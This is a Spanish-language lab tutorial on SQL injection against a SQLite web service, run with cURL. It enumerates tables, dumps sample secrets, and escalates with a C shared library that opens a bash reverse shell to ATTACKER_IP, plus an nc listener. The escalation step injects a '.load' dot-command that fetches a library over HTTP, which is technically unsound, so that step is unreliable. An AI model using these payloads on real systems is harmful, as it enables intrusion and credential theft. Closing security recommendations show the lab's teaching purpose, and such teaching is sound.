
---
# Laboratorio práctico: Explotación de SQLite3 a través de cURL

## Objetivo

Simular un entorno vulnerable donde:

- Existe un servicio web que usa SQLite3 sin sanitización de entradas.
- Podemos interactuar con él usando `cURL`.
- Descubrimos información sensible mediante inyección SQL (específica para SQLite).
- Se plantea una escalada en caso de que esté permitida la extensión `load_extension()`.

---

## Paso 1: Verificar vulnerabilidad con cURL

Comprobamos comportamiento normal:

```bash
curl "http://localhost:8080/search?query=a"
````

Probamos con una comilla para romper la consulta:

```bash
curl "http://localhost:8080/search?query='"
```

Si devuelve un error SQL, es vulnerable a inyección.

---

## Paso 2: Enumerar tablas

SQLite almacena su esquema en la tabla `sqlite_master`. Para enumerar tablas:

```bash
curl "http://localhost:8080/search?query=' UNION SELECT name FROM sqlite_master WHERE type='table'--"
```

Resultado típico:

```
users
secrets
```

---

## Paso 3: Obtener estructura de tabla

Para ver cómo está definida la tabla `secrets`:

```bash
curl "http://localhost:8080/search?query=' UNION SELECT sql FROM sqlite_master WHERE tbl_name='secrets'--"
```

Resultado:

```
CREATE TABLE secrets (id INTEGER PRIMARY KEY, secret TEXT, created_at DATETIME);
```

---

## Paso 4: Leer datos de una tabla

Para extraer secretos:

```bash
curl "http://localhost:8080/search?query=' UNION SELECT secret FROM secrets--"
```

Posibles resultados:

```
ssh_pass=SuperS3cret123
api_key=ABCDEF123456789
```

---

## Paso 5 (opcional): Ejecutar una reverse shell con load_extension

Si `load_extension()` está habilitado, podríamos ejecutar una carga maliciosa.

### Crear biblioteca compartida

```c
// shell.c
#include <stdlib.h>
void _init() {
  system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'");
}
```

Compilarla:

```bash
gcc -fPIC -shared -o shell.so shell.c
python3 -m http.server 80  # para servir la .so
```

### Intentar cargarla (si el servidor permite):

```bash
curl "http://localhost:8080/search?query='; .load http://ATTACKER_IP/shell.so --"
```

Y en el listener:

```bash
nc -lvnp 4444
```

---

## Recomendaciones de seguridad

- Nunca concatenar directamente entradas en consultas SQL.
    
- Usar sentencias preparadas (prepared statements).
    
- Deshabilitar `load_extension` en SQLite si no es estrictamente necesario.
    
- Revisar los permisos del fichero `.db` y sus extensiones.
    

---

## Referencias

- [https://sqlite.org](https://sqlite.org/)
    
- [https://owasp.org/www-community/attacks/SQL_Injection](https://owasp.org/www-community/attacks/SQL_Injection)
    
- [https://gtfobins.github.io/gtfobins/sqlite3/](https://gtfobins.github.io/gtfobins/sqlite3/)
    
- [https://github.com/sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap)
    

---
